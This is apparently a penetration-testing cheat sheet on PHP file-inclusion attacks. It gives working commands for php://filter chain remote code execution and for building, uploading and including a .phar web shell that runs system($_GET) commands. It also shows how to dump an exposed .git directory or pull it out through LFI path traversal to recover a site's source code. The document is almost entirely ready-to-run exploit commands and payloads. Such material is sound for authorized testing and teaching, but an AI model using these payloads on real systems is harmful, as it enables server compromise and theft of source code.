# PHP Filter Chain RCE

`php://filter` conversion chains can be used to generate arbitrary PHP file content from a `include()` or `require()` call — no file write needed.

## When it applies

Any PHP `include`/`require` that accepts user input, including wrappers like `?page=`, even when the path must end in `.php`. Works because the filter chain generates PHP code in-memory.

## Exploit

```bash
# Tool: php_filter_chain_generator
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
# Outputs a very long php://filter/... string

# Use the chain as the include parameter
curl "http://<TARGET>/?page=<CHAIN>&cmd=id"
```

## .phar Archive Inclusion

If a PHP app includes user-supplied filenames and you can upload a `.phar`:
```bash
# Create phar with PHP payload embedded
php -r "\$p = new Phar('shell.phar'); \$p->addFromString('x.php', '<?php system(\$_GET[\"c\"]); ?>'); \$p->setStub('<?php __HALT_COMPILER(); ?>');"
# Upload shell.phar (even via image upload if extension not checked on content)
# Include via phar wrapper:
curl "http://<TARGET>/?page=phar:///var/www/uploads/shell.phar/x.php&c=id"
```

## Git Repo Exfil via LFI → Source Code Recovery

If `.git/` is accessible (or readable via LFI):
```bash
# Dump entire git repo object store
git-dumper http://<TARGET>/.git ./repo
# OR via LFI:
for f in HEAD config FETCH_HEAD ORIG_HEAD refs/heads/main packed-refs; do
  curl "http://<TARGET>/?page=....//....//var/www/html/.git/$f" -o "repo/.git/$f"
done
cd repo && git checkout -- .  # recover source files
```
